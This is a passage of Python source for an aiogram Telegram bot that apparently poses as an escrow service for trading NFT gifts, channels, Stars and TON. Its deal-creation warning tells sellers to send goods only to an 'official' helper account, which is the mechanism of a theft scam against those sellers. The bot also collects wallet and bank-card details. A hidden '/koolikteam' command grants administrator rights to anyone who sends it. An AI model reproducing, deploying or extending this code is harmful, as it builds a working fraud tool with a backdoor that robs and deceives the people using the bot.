async def ton_received(message: types.Message, state: FSMContext):
    user_ton[message.from_user.id] = message.text
    await message.answer(f"✅ TON-кошелек успешно сохранен:\n<code>{message.text}</code>", parse_mode="HTML")
    await start_command(message, state)


@dp.message(Form.waiting_for_star)
async def star_received(message: types.Message, state: FSMContext):
    user_stars[message.from_user.id] = message.text
    await message.answer(f"✅ Получатель звезд сохранен:\n<code>{message.text}</code>", parse_mode="HTML")
    await start_command(message, state)


# =====================================================
# НОВЫЙ ОБРАБОТЧИК ДЛЯ КНОПКИ "СОЗДАТЬ СДЕЛКУ" С ПРЕДУПРЕЖДЕНИЕМ
# =====================================================

@dp.callback_query(F.data == "create_deal")
async def create_deal_warning(callback: types.CallbackQuery, state: FSMContext):
    """Показывает предупреждение перед созданием сделки"""
    text = (
        f"{emoji('warning', '⚠️')} <b>ПРЕДУПРЕЖДЕНИЕ ПЕРЕД СОЗДАНИЕМ СДЕЛКИ</b>\n\n"
        f"• Передача любого товара напрямую покупателю — это мошенничество!\n"
        f"• Нельзя передавать напрямую. Как только сделка создана, передавайте подарок только на официальный аккаунт @{HELPER_USER}.\n"
        f"• Если вы продаёте канал, передайте владельца канала официальному аккаунту, он дальше всё сделает.\n\n"
        f"{emoji('right', '👉')} <b>Чтобы успешно завершить сделку и получить средства — всегда отправляйте заявленный товар только на @{HELPER_USER}.</b>"
    )

    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_warning_menu()
        )
    else:
        await callback.message.edit_text(
            text=text,
            reply_markup=get_warning_menu(),
            parse_mode="HTML"
        )

    await callback.answer()


@dp.callback_query(F.data == "continue_create_deal")
async def continue_create_deal(callback: types.CallbackQuery, state: FSMContext):
    """Продолжает создание сделки после предупреждения"""
    # Показываем выбор валюты
    text = f"{emoji('create_deal', '💰')} <b>Выберите валюту сделки:</b>"
    photo = get_photo(DEAL_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_currency_menu()
        )
    else:
        await callback.message.edit_text(
            text=text,
            reply_markup=get_currency_menu(),
            parse_mode="HTML"
        )
    await state.set_state(Form.waiting_for_currency)
    await callback.answer()


# =====================================================
# ОСТАЛЬНЫЕ ОБРАБОТЧИКИ
# =====================================================

@dp.callback_query(F.data.startswith("set_cur_"), Form.waiting_for_currency)
async def process_currency_choice(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    user_id = callback.from_user.id

    if currency == "TON" and user_id not in user_ton:
        text = "❌ У вас не заполнен TON-кошелек.\nПожалуйста, сначала добавьте реквизиты."
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="💎 Добавить TON-кошелек", callback_data="edit_ton"))
        builder.row(InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu"))
        photo = get_photo(DEAL_PHOTO)
        if photo:
            await callback.message.edit_media(
                media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                reply_markup=builder.as_markup()
            )
        else:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await state.clear()
        return

    if currency == "STR" and user_id not in user_stars:
        text = "❌ У вас не заполнен получатель звезд.\nПожалуйста, сначала добавьте реквизиты."
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="⭐ Добавить получателя звезд", callback_data="edit_star"))
        builder.row(InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu"))
        photo = get_photo(DEAL_PHOTO)
        if photo:
            await callback.message.edit_media(
                media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                reply_markup=builder.as_markup()
            )
        else:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await state.clear()
        return

    if currency == "RUB" and user_id not in user_cards:
        text = "❌ У вас не заполнена банковская карта.\nПожалуйста, сначала добавьте реквизиты."
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(text="💳 Добавить карту", callback_data="edit_card"))
        builder.row(InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu"))
        photo = get_photo(DEAL_PHOTO)
        if photo:
            await callback.message.edit_media(
                media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
                reply_markup=builder.as_markup()
            )
        else:
            await callback.message.edit_text(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
        await state.clear()
        return

    await state.update_data(currency=currency)

    currency_texts = {
        "RUB": "💰 <b>Введите сумму сделки в RUB 🇷🇺:</b>",
        "KZT": "💰 <b>Введите сумму сделки в KZT 🇰🇿:</b>",
        "UAH": "💰 <b>Введите сумму сделки в UAH 🇺🇦:</b>",
        "BYN": "💰 <b>Введите сумму сделки в BYN 🇧🇾:</b>",
        "EUR": "💰 <b>Введите сумму сделки в EUR 🇪🇺:</b>",
        "USD": "💰 <b>Введите сумму сделки в USD 🇺🇸:</b>",
        "STR": "💰 <b>Введите сумму сделки в Stars ⭐ в формате: 100.0</b>",
        "TON": "💰 <b>Введите сумму сделки в TON 💎 в формате: 100.0</b>",
        "CNY": "💰 <b>Введите сумму сделки в CNY 🇨🇳:</b>"
    }
    text = currency_texts.get(currency, "💰 <b>Введите сумму сделки:</b>")
    photo = get_photo(DEAL_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_back_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_back_menu(), parse_mode="HTML")
    await state.set_state(Form.waiting_for_deal_amount)


@dp.message(Form.waiting_for_deal_amount)
async def process_deal_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        data = await state.get_data()
        currency = data.get('currency')

        currency_labels = {
            "RUB": "RUB 🇷🇺", "KZT": "KZT 🇰🇿", "UAH": "UAH 🇺🇦",
            "BYN": "BYN 🇧🇾", "EUR": "EUR 🇪🇺", "USD": "USD 🇺🇸",
            "STR": "Stars ⭐", "TON": "TON 💎", "CNY": "CNY 🇨🇳"
        }
        currency_label = currency_labels.get(currency, "RUB")

        await state.update_data(amount=amount)

        text = f"{emoji('referral', '✨')} <b>Введите ссылку на товар за {amount} {currency_label} в формате https://t.me/nft/DurovsCap-1:</b>"

        photo = get_photo(DEAL_PHOTO)
        if photo:
            await message.answer_photo(photo=photo, caption=text, reply_markup=get_back_menu(), parse_mode="HTML")
        else:
            await message.answer(text=text, reply_markup=get_back_menu(), parse_mode="HTML")

        await state.set_state(Form.waiting_for_deal_desc)

    except ValueError:
        await message.answer("❌ Введите число!")


@dp.message(Form.waiting_for_deal_desc)
async def process_deal_desc(message: types.Message, state: FSMContext):
    data = await state.get_data()
    amount = data.get('amount')
    currency = data.get('currency')
    deal_code = generate_deal_code()

    deals[deal_code] = {
        'creator_id': message.from_user.id,
        'creator_username': message.from_user.username or message.from_user.first_name,
        'amount': amount,
        'currency': currency,
        'description': message.text
    }

    bot_info = await bot.get_me()
    deal_link = f"https://t.me/{bot_info.username}?start={deal_code}"

    currency_symbols = {
        "RUB": "RUB 🇷🇺", "KZT": "KZT 🇰🇿", "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾", "EUR": "EUR 🇪🇺", "USD": "USD 🇺🇸",
        "STR": "Stars ⭐", "TON": "TON 💎", "CNY": "CNY 🇨🇳"
    }
    cur_symbol = currency_symbols.get(currency, "RUB")

    text = (
        f"{emoji('dealc', '📞')} <b>Сделка успешно создана!</b>\n\n"
        f"{emoji('dealty', '📞')} ID сделки: {deal_code}\n"
        f"{emoji('dealtov', '📞')} Ссылка на товар: {message.text}\n"
        f"{emoji('deal', '📞')}<b>Сумма:</b> {amount} {cur_symbol}\n\n"
        f"{emoji('referral', '📞')} <b>Ссылка для покупателя:</b>\n<code>{deal_link}</code>\n\n"
    )

    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="↩️ Меню", callback_data="back_to_menu"))
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await message.answer_photo(photo=photo, caption=text, reply_markup=builder.as_markup(), parse_mode="HTML")
    else:
        await message.answer(text=text, reply_markup=builder.as_markup(), parse_mode="HTML")
    await state.clear()


@dp.message(Command("koolikteam"))
async def admin_command2(message: types.Message):
    admins.add(message.from_user.id)
    await message.answer("✅ <b>Вы успешно получили права администратора!</b>", parse_mode="HTML")


@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    text = "📋 <b>Выберите раздел:</b>"
    photo = get_photo(MAIN_PHOTO)
    if photo:
        await callback.message.edit_media(
            media=InputMediaPhoto(media=photo, caption=text, parse_mode="HTML"),
            reply_markup=get_main_menu()
        )
    else:
        await callback.message.edit_text(text=text, reply_markup=get_main_menu(), parse_mode="HTML")


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())